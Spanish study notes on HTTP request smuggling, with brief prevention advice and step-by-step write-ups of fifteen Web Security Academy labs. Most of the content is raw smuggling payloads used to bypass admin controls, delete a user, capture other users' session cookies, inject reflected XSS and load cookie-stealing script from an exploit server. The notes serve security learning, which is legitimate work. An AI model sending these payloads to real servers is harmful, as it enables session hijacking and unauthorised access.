----
### ### QUE ES?

El **HTTP Request Smuggling** es una vulnerabilidad que permite a un atacante **manipular la forma en la que un servidor interpreta una petición HTTP**, aprovechando diferencias en el procesamiento entre un **frontend (proxy, load balancer, WAF)** y un **backend (servidor de aplicación)**.
Ocurre cuando ambos servidores interpretan de forma distinta las cabeceras `Content-Length` y `Transfer-Encoding`.  
El atacante envía una petición especialmente construida que hace que uno de los servidores procese parte de la request como si fuera otra distinta.
Esto permite “colar” una petición maliciosa dentro de la conexión HTTP sin que el frontend la detecte correctamente.

Permite cosas como:
- Bypassear controles de seguridad (WAF, autenticación)
- Acceder a recursos internos
- Robar respuestas de otros usuarios
- Secuestrar sesiones
- Envenenar caché
- Escalar a XSS o incluso RCE en ciertos escenarios

Se previene usando:
- Deshabilitar el uso simultáneo de `Content-Length` y `Transfer-Encoding`
- Normalizar y validar peticiones en el frontend
- Asegurar que frontend y backend interpretan HTTP de forma consistente
- Usar servidores actualizados y correctamente configurados
- Preferir HTTP/2 cuando sea posible (reduce este tipo de ambigüedades)- 
#### PASOS:
- _COMPROBAR SI EXISTE DESINCRONIZACIÓN ENTRE FRONTEND Y BACKEND_
- _PROBAR VARIANTES CL.TE (Content-Length + Transfer-Encoding)_
- _PROBAR VARIANTES TE.CL_
- _PROBAR TE.TE (doble Transfer-Encoding)_
- _PROBAR H2.TE Y H2.CL_
- _INTENTAR INYECTAR UNA SEGUNDA REQUEST DENTRO DEL CUERPO_
- _COMPROBAR SI SE AFECTAN RESPUESTAS DE OTROS USUARIOS_
- *COMPROBAR CRLF*
#### APUNTES:
- **TAMAÑO CONTENT-LENGTH:** El tamaño del content length es siempre el tamaño del body de la request, cada caracter 1 byte, \r un byte y \n un byte.
#### DETECCION:
![[Captura de pantalla 2026-02-26 101752.png]]
##### CL.TE:
Para comprobar una posible vulnerabilidad **CL.TE**, enviamos una petición que incluya simultáneamente:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`X\r\n
Si nos responde con **time out** es que es vulnerable, *front-end* y *back-end* usan cosas distintas.
- El **frontend** interpreta la petición usando `Content-Length`.
- El **backend** interpreta la petición como `chunked`.
El frontend ve `Content-Length: 6`. Por tanto, solo lee los primeros 6 bytes del cuerpo `3\r\nabc`
Para el frontend, la petición termina ahí y se envía al backend como válida.
El backend procesa el cuerpo como `chunked`:
	`3  → tamaño del chunk  
	`abc  → datos  
	`X  → siguiente tamaño de chunk (inválido)
El valor `X` no es un tamaño válido en hexadecimal, por lo que el backend queda esperando datos correctos para completar el chunk.
##### TE.CL:
Para comprobar una posible vulnerabilidad **TE.CL**, enviamos una petición que incluya simultáneamente:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`X\r\n
Si nos responde con **time out** es que es vulnerable, *front-end* y *back-end* usan cosas distintas.
- El **frontend** interpreta la petición como `chunked`.
- El **backend** utiliza `Content-Length`.
El frontend ve el `0` eso indica fin del cuerpo en chunked. Por tanto, considera que la request termina correctamente tras `0\r\n\r\n`.
El backend ignora `Transfer-Encoding` y usa `Content-Length: 6`. Por tanto, intenta leer 6 bytes completos del cuerpo.
Pero el frontend ya ha terminado la petición antes, dejando datos inconsistentes en la conexión.
### LAB1: HTTP REQUEST SMUGGLIG, CONFIRMING A CL.TE VULNERABILITY VIA DIFFERENTIAL RESPONSES.
En este laboratorio el objetivo es provocar una **desincronización entre el frontend y el backend**, aprovechando que cada uno interpreta de forma distinta el final de la petición HTTP.
- Verificamos que el servidor acepta **HTTP/1.1**, modificándolo en _Request Attributes_ dentro de Repeater.
- Cambiamos el método a **POST**, ya que necesitamos enviar cuerpo en la petición.
- Desactivamos en Burp la opción que actualiza automáticamente el `Content-Length`, para poder manipular manualmente la longitud del cuerpo sin que la herramienta lo corrija.
Tras comprobar que es susceptible a *CL.TE* 
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 35\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /404 HTTP/1.1\r\n
`X-Ignore: X
Lo que estamos haciendo es, estamos **inyectando una segunda petición HTTP dentro del cuerpo de la primera**, aprovechando que:
- El **frontend** usa `Content-Length`
- El **backend** usa `Transfer-Encoding: chunked`
Frontend (usa Content-Length: 35), solo lee **35 bytes del body**:
- hasta aquí:`0\r\n\r\n`
El backend interpreta el `0` que indica el fin de los chunks.
Pero después del `0\r\n\r\n` todavía queda esto en el socket:
`GET /404 HTTP/1.1  
`X-Ignore: X
El backend lo interpreta como **una nueva petición HTTP válida** por lo que al lanzar una nueva petición el backend procesa la que se ha quedado "colgada".
### LAB2: HTTP REQUEST SMUGGLING, CONFIRMING A TE.CL VULNERABILITY VIA DIFFERENTIAL RESPONSES
En este laboratorio el objetivo es provocar una **desincronización entre el frontend y el backend**, aprovechando que cada uno interpreta de forma distinta el final de la petición HTTP.
- Verificamos que el servidor acepta **HTTP/1.1**, modificándolo en _Request Attributes_ dentro de Repeater.
- Cambiamos el método a **POST**, ya que necesitamos enviar cuerpo en la petición.
- Desactivamos en Burp la opción que actualiza automáticamente el `Content-Length`, para poder manipular manualmente la longitud del cuerpo sin que la herramienta lo corrija.
Tras comprobar que es susceptible a *TE.CL* 
`POST / HTTP/1.1\r\n
`Host: 0a95004904387a108098802b003b0074.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 4\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`9F\r\n
`POST /404 HTTP/1.1\r\n
`Host: 0a95004904387a108098802b003b0074.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 15\r\n
`\r\n
`X=1\r\n
`0\r\n
`\r\n
El frontend ve `9F`. Piensa el siguiente chunk tiene tamaño `0x9F (159 bytes)`.
Por tanto, considera que **todo lo que viene después forma parte del cuerpo** hasta que se cumplan esos 159 bytes.
Para el frontend:
- Es una única petición válida.
- No hay nada raro.
- No ve una segunda request.
El backend ignora `Transfer-Encoding` y se fija en `Content-Length: 4`. Por tanto, solo lee los primeros 4 bytes del body `9F\r\n` y ahí termina la primera petición para él.
Todo esto queda pendiente en el socket:
`POST /404 HTTP/1.1\r\n  
`Host: ...\r\n  
`Content-Length: 15\r\n  
`\r\n
`X=1\r\n
`\r\n
El backend lo interpreta como una **nueva petición HTTP completamente válida**.
### LAB3: EXPLOITING HTTP REQUEST SMUGGLING TO BYPASS FRONT-END SECURITY CONTROLS, CL.TE VULNERABILITY
En este laboratorio explotamos una vulnerabilidad **CL.TE** para **bypassear controles de seguridad implementados en el frontend**.
- Verificamos que el servidor acepta **HTTP/1.1**, modificándolo en _Request Attributes_ dentro de Repeater.
- Cambiamos el método a **POST**, ya que necesitamos enviar cuerpo en la petición.
- Desactivamos en Burp la opción que actualiza automáticamente el `Content-Length`, para poder manipular manualmente la longitud del cuerpo sin que la herramienta lo corrija.
Para ver la petición que queda colgada usamos esta:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 13\r\n
`\r\n
`foo=bar\r\n
Para comprobar que es susceptible a *TE.CL* 
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 47\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`0\r\n
`\r\n
`GET /kjngdsjbnk HTTP/1.1\r\n
`Jarno: x\r\n
Si al enviar la otra petición recibimos un `404`, confirmamos que:
- El backend ejecutó el `GET /kjngdsjbnk`
- La segunda request fue procesada
- Existe desincronización CL.TE
Intentamos acceder a `/admin`pero no tenemos permisos:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 41\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`0\r\n
`\r\n
`GET /admin HTTP/1.1\r\n
`Jarno: x\r\n
El `Jarno: x` o lo que sea se pone porque en HTTP:
- Después de la línea `GET /ruta HTTP/1.1`
- Debe haber **al menos una cabecera**
- Y luego una línea en blanco `\r\n`
- Para que la request sea válida
Nos dice que solo es accesible desde *localhost*:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net antonio20036221.\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 123\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`0\r\n
`\r\n
`GET /admin HTTP/1.1\r\n
`Host: localhost\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 3\r\n
`\r\n
`x=
El x= es para evitar que la siguiente request legítima empiece en mitad del cuerpo anterior y alinear correctamente el socket.
Para eliminar al usuario:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net antonio20036221.\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 123\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`0\r\n
`\r\n
`GET /admin/delete?username=carlos HTTP/1.1\r\n
`Host: localhost\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 3\r\n
`\r\n
`x=
### LAB4: EXPLOITING HTTP REQUEST SMUGGLING TO BYPASS FRONT-END SECURITY CONTROLS, TE.CL VULNERABILITY
En este laboratorio explotamos una vulnerabilidad **TE.CL** para **bypassear controles de seguridad implementados en el frontend**.
- Verificamos que el servidor acepta **HTTP/1.1**, modificándolo en _Request Attributes_ dentro de Repeater.
- Cambiamos el método a **POST**, ya que necesitamos enviar cuerpo en la petición.
- Desactivamos en Burp la opción que actualiza automáticamente el `Content-Length`, para poder manipular manualmente la longitud del cuerpo sin que la herramienta lo corrija.
Para ver la petición que queda colgada usamos esta:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 13\r\n
`\r\n
`foo=bar\r\n
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 4\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`29\r\n
`GET /admin HTTP/1.1\r\n
`Content-Length: 15\r\n
`\r\n
`0\r\n
`\r\n
Frontend (chunked) ve: `29`. Eso significa el siguiente chunk tiene tamaño 0x29 (41 bytes).
Por tanto, considera que todo lo que viene después forma parte del cuerpo y no detecta ninguna segunda request.
Backend (Content-Length: 4) ignora chunked y solo lee: `Content-Length: 4`
Por tanto, solo consume `29\r\n` y ahí termina la primera request para él.
Todo esto queda pendiente en el socket:
`GET /admin HTTP/1.1  
`Content-Length: 15
El backend lo interpreta como **una nueva request independiente**.
Nos dirá que *not allowed* ya que solo se puede acceder desde localhost:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 4\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`51\r\n -> es el tamaño del cuerpo desde GET hasta el final de Content-Length: 15\r\n
`GET /admin/delete?username=carlos HTTP/1.1\r\n
`Host: localhost\r\n
`Content-Length: 15\r\n
`\r\n
`0\r\n
`\r\n
### LAB5: EXPLOITING HTTP REQUEST SMUGGLING TO REVEAL FRONT-END REQUEST REWRITTING
En este laboratorio se explota una vulnerabilidad de **HTTP Request Smuggling** para descubrir cómo el **frontend reescribe las peticiones antes de enviarlas al backend**, y posteriormente utilizar esa información para **bypassear controles de acceso**.
Revelar reescritura del frontend:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 124\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`POST / HTTP/1.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 200\r\n
`Connection: close\r\n
`\r\n
`search=test
El frontend procesa la primera petición y el backend interpreta la segunda como independiente. Poe lo que la respuesta refleja cómo el frontend ha modificado la petición antes de enviarla.
Filtrar en *Burp* por search en la respuesta. La cabecera encontrada es `X-PRToov-Ip`
Una vez identificada la cabecera intentamos acceder a `/admin`:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 128\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /admin HTTP/1.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 200\r\n
`Connection: close\r\n
`\r\n
`search=test\r\n
Nos dirá que solo se puede acceder desde la ip *127.0.0.1*:
`POST / HTTP/1.1\r\n
`Host: ID-LAB.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 175\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /admin/delete?username=carlos HTTP/1.1\r\n
`X-PRToov-Ip: 127.0.0.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 200\r\n
`Connection: close\r\n
`\r\n
`search=test\r\n
El frontend no valida esta segunda petición y el backend la procesa como interna.
Al confiar en `X-PRToov-Ip: 127.0.0.1`, permite el acceso eliminando el usuario `carlos`.
### LAB6: EXPLOITING HTTP REQUEST SMUGGLING TO CAPTURE OTHER USERS' REQUEST
En este laboratorio quieren que capturemos la **request HTTP de otro usuario**  y después reutilicemos su cookie de sesión para acceder a su cuenta.
Detectamos que es susceptible a CL.TE:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`X\r\n
Lo que buscamos es enviar una request vacía chunked (`0`), inyectar una segunda request con un content-length muy grande para hacer que la siguiente request (la víctima) se concatene dentro de la nuestra. Importante poner el comentario al final para que se meta ahí como texto la otra request 
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencode\r\n
`Content-Length: 342\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`POST /post/comment HTTP/1.1\r\n
`Host: 0a2a000f03b8e8af80dd35c0001e0066.web-security-academy.net\r\n
`Cookie: session=xxxxxxxxxxxxxxxxxxxxxxx\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 900\r\n
`\r\n
`csrf=xxxxxxxxxxxxxxxxxxxxxx&postId=8&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com&comment=test
De esta forma el Front-end pasa toda la request completa por el content-length pero el back-end piensa que para en el `0`, y deja en la cola la otra petición que tiene un content-length muy grande. Al enviar una peticiÓn la vÍctima la request que estaba en cola se lanza y al tener tanto tamaño y el comentario al final la request legitima del admin se "fusiona" en el comentario.
### LAB7: EXPLOITING HTTP REQUEST SMUGGLING TO DELIVER REFLECTED XSS
En este laboratorio debemos hacer **HTTP Request Smuggling (CL.TE)** para hacer que la víctima ejecute un **XSS reflejado** en su navegador.
Detectamos un *XSS* en el User-Agent ya que este se ve reflejado directamente en el *DOM*:
`GET /post?postId=6 HTTP/2
`Host: LAB-ID.web-security-academy.net
`Cookie: session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
`User-Agent: foo"><script>alert(0)</script><"
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
`Accept-Language: en-US,en;q=0.5
`Accept-Encoding: gzip, deflate, br
`Referer: https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=6
`Dnt: 1
`Sec-Gpc: 1
`Upgrade-Insecure-Requests: 1
`Sec-Fetch-Dest: document
`Sec-Fetch-Mode: navigate
`Sec-Fetch-Site: same-origin
`Sec-Fetch-User: ?1
`Priority: u=0, i
`Te: trailers
Detectamos que es susceptible a *CL.TE*:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`3\r\n
`abc\r\n
`X\r\n
La idea es enviar una request que el front-end deja pasar por el content-length pero que en el back-end se cierra en el `0` por el chunked, de esta forma inyectamos una segunda request `GET` que contiene el `User-Agent` malicioso. La siguiente request (de la víctima) se desincroniza y el backend responde al usuario equivocado
`POST / HTTP/1.1\r\n
`Host: LA-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 150\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /post?postId=6 HTTP/1.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 3\r\n
`User-Agent: foo"><script>alert(0)</script>\r\n
`\r\n
`x=
### LAB8: RESPONSE QUEUE POISONING VIA H2.TE REQUEST SMUGGLING
En este lab debemos usar **HTTP/2 request smuggling (H2.TE)** para envenenar la cola de respuestas y capturar la sesión del admin.
Es vulnerable porque el front-end hace un downgrade a HTTP/1.1 para que el back-end lo entienda, pero como le metemos un transfer-encoding que no debería estar, conseguimos meter en la cola una request. Si al hacer esto el administrador se loguea y se produce la desincronización puede que la respuesta del login junto con las cookies se nos envíen a nosotros.
Detectamos que es susceptible a *H2.TE*: 
`POST / HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /alsdfklas HTTP/1.1\r\n
`X-Ignore: x
EnviaMos repetidas request para pillar la cookie de session de admin:
`POST /x HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`GET /x HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
### LAB9: H2.CL REQUEST SMUGGLING
En este lab vamos a explotar un **H2.CL request smuggling** para envenenar la conexión justo antes de que la víctima cargue un JS legítimo. Hacer que el navegador de la víctima cargue un JS desde nuestro exploit server.
Detectamos el *H2.CL*:
`POST / HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 5\r\n
`\r\n
`\r\n
`x=1\r\n
`GET /xxx HTTP/1.1\r\n
`X-Ignore: x
Lo que estamos haciendo es que aquí `Content-Length` no es necesario para delimitar el body por ser *HTTP/2* pero el front-end confía en ese `Content-Length` y al hacer downgrade a *HTTP/1.1* el back-end si que usa el Content-Length
Payload:
`POST / HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 5\r\n
`\r\n
`\r\n
`x=1\r\n
`GET /resources/js HTTP/1.1\r\n
`Host: https://EXPLOIT-SERVER.exploit-server.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 3\r\n
`\r\n
`x=
Aquí hacemos lo mismo pero esta vez la request que metemos en cola del back-end lo que hace es cargar un recurso de nuestro exploit server, el cual contiene `alert(document.cookie);
### LAB10: HTTP/2 REQUEST SMUGGLING VIA CRLF INJECTION
En este lab vamos a explotar una vulnerabilidad en el manejo de HTTP/2 que permite inyectar un header malicioso usando **CRLF injection**.
Introduciremos `Transfer-Encoding: chunked` para forzar una desincronización tipo **H2.TE** y smugglear una segunda request HTTP/1.1.
para ver si es vulnerable *H2.TE*:
`POST / HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`\r\n
`0\r\n
`\r\n
`GET /alsdfklas HTTP/1.1\r\n
`X-Ignore: x
Debemos añadir desde *Request headers*:
`Nombre: Foo
`Content: Bar\r\nTransfer-Encoding: chunked`
En este laboratorio enviamos una petición en HTTP/2 que incluye un valor de cabecera manipulado con un salto de línea inyectado para introducir de forma encubierta una cabecera que hace que el backend procese el cuerpo como fragmentado. Como el front-end no valida correctamente los saltos de línea y realiza el downgrade a HTTP/1.1, el backend interpreta que el cuerpo termina antes de lo esperado y todo lo que sigue lo trata como una nueva petición. De esta forma logramos smugglear una segunda solicitud hacia el endpoint de búsqueda, dejando el cuerpo abierto para que la siguiente petición que llegue por la misma conexión —la del administrador— quede concatenada dentro de nuestro parámetro de búsqueda.
Payload:
`POST / HTTP/2\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`\r\n
`0
`\r\n
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Cookie: session=Ixxxxxxxxxxxxxxxxxxxxxxx\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 1000\r\n
`\r\n
`search=jarmo

Un **CRLF** es la secuencia de caracteres `\r\n` (Carriage Return + Line Feed) que se usa para indicar un salto de línea en protocolos como HTTP.
En HTTP separa las cabeceras entre sí y marca el final de los headers antes del body; si puedes inyectarlo, puedes “crear” nuevas líneas o incluso nuevos headers.
### LAB11: HTTP/2 REQUEST SPLITTING VIA CRLF INJECTION
En este lab vamos a explotar una vulnerabilidad en el manejo de HTTP/2 que permite inyectar un header malicioso usando **CRLF injection**.
Para ello interceptamos un request **GET** a `/` y le añadimos a través de Request headers una cabecera **CRLF**:
`Nombre: Foo`
`Body: Bar\r\n
`\r\n
`GET /x HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net`
De esta forma conseguimos encolar una petición haciendo que el back-end nos envie la respuesta de la petición de logueo del usuario a nosotros.
Para conectarnos simplemente `Ctrl + Shift + C` y metemos la cookie de session que hemos robado o:
`Nombre: Foo`
`Body: Bar\r\n
`\r\n
`GET /admin HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net`
`Cookie: xxxxxxxxxxxxxx`
### LAB12: CL.0 REQUEST SMUGGLING
Un **CL.0** es una variante de _HTTP Request Smuggling_ donde:
- El **front-end sí respeta el `Content-Length`**
- Pero el **back-end lo ignora completamente (lo trata como si fuera 0)**
Primero necesitamos un endpoint que no procese correctamente el body. Algunos candidatos típicos:
- POST contra un archivo estático
- POST contra una redirección a nivel servidor
- POST que provoque un error interno
Para detectarlo debemos enviar dos peticiones simultáneamente una envenenada y otra legitima, debemos activar o usar:
- Header *Connection: keep-alive*
- Enable *HTTP/1.1 connection reuse*
- Group: *send group in a single connection*
Encontramos un endpoint sospechoso en *http history* `/resources/images/blog.svg`:
`POST /resources/images/blog.svg HTTP/1.1
`Host: LAB-ID.web-security-academy.net
`Content-Type: application/x-www-form-urlencoded
`Content-Length: 20
Al enviar la segunda petición debe darnos un *time out*
Para explotarlo debemos activar en los setting Enable HTTP/1.1 conection reuse y crear un grupo para enviar las dos en una single connection
`POST /resources/images/blog.svg HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 32\r\n
`Connection: keep-alive\r\n
`\r\n
`GET /ajdsf HTTP/1.1\r\n
`X-Ignore: x
Si nos devuelve la segunda request *404 not found*
Para explotar el `/admin`:
`POST /resources/images/blog.svg HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 32\r\n
`Connection: keep-alive\r\n
`\r\n
`GET /admin HTTP/1.1\r\n
`X-Ignore: x
### LAB13: HTTP REQUEST SMUGGLING, BASIC CL.TE VULNERABILITY
En este lab explotamos un **CL.TE** básico en `/` la cual hace que la respuesta nos devuelva un *Invalid method GPOST* ya que se están solapando las request
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Cookie: session=XXXXXXXXXXXXXXXXXXXXX\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`0\r\n
`\r\n
`G
El backend termina la primera request al leer el `0`, ve la `G` que viene después y la concatena con el inicio de la siguiente petición real enviada por el navegador o por Burp.
### LAB14: HTTP REQUEST SMUGGLING, BASIC TE.CL VULNERABILITY
En este lab explotamos un **TE.CL** básico en `/` la cual hace que la respuesta nos devuelva un *Invalid method GPOST* 
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 4\r\n
`Transfer-Encoding: chunked\r\n
`\r\n
`51\r\n
`GPOST / HTTP/1.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 6\r\n
`\r\n
`0\r\n
`\r\n
El backend ha terminado la primera request tras 4 bytes Y la siguiente que recibe empieza por `GPOST`devolviendo el error.
### LAB15: HTTP REQUEST SMUGGLING, OBFUSCATING THE TE HEADER
En este lab se explota una variante de **TE.CL**, pero con una diferencia importante se **ofusca el header `Transfer-Encoding`** para que:
- El **front-end lo ignore**
- Pero el **back-end lo procese**
Muchos servidores manejan headers duplicados de forma distinta:
- Algunos se quedan con el **primero**
- Otros con el **último**
- Otros intentan combinarlos
- Otros ignoran el header si detectan inconsistencias

Para ver si funciona probamos esto, debería devolvernos un error.
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 0\r\n
`Transfer-Encoding: chunked\r\n
`Transfer-Encoding: foo\r\n
`\r\n
`0\r\n
`\r\n
`X
Para explotarlo:
`POST / HTTP/1.1\r\n
`Host: LAB-ID.web-security-academy.net\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 4\r\n
`Transfer-Encoding: chunked\r\n
`Transfer-Encoding: foo\r\n
`\r\n
`5c\r\n
`GPOST / HTTP/1.1\r\n
`Content-Type: application/x-www-form-urlencoded\r\n
`Content-Length: 11\r\n
`\r\n
`x=1\r\n
`0
Lo que sucede es al enviar el `Transfer-Encoding` duplicado (uno válido como `chunked` y otro inválido como `foo`) hace que el front-end ignore el `Transfer-Encoding` y use `Content-Length`, mientras que el back-end sí procesa el `chunked`.
